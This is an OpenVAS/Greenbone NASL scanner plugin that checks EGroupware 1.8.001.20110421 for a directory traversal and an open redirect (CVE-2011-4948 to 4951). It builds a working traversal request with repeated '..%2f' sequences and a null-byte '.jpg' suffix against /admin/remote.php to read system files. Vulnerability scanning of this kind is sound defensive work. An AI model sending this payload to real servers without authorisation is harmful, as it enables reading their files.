# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:egroupware:egroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801944");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-4951", "CVE-2011-4950", "CVE-2011-4949", "CVE-2011-4948");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("EGroupware Multiple Vulnerabilities (May 2011) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_egroupware_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("egroupware/http/detected");

  script_tag(name:"summary", value:"EGroupware is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Input validation error in 'type' parameter to '/admin/remote.php?', which allows attackers to
  read arbitrary files via a ..%2f(dot dot) sequences.

  - Open redirect in '/phpgwapi/ntlm/index.php', when handling the URL.");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application or to redirect
  to an arbitrary URL.");

  script_tag(name:"affected", value:"EGroupware version 1.8.001.20110421 and probably prior.");

  script_tag(name:"solution", value:"Update to version 1.8.001.20110805 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17322/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52770");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101676/eGroupware1.8.001.20110421-LFI.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101675/eGroupware1.8.001.20110421-Redirect.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/admin/remote.php?uid=a&type=" + crap(data: "..%2f", length: 3 * 15) + files[file] +
        "%00.jpg&creator_email=a";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
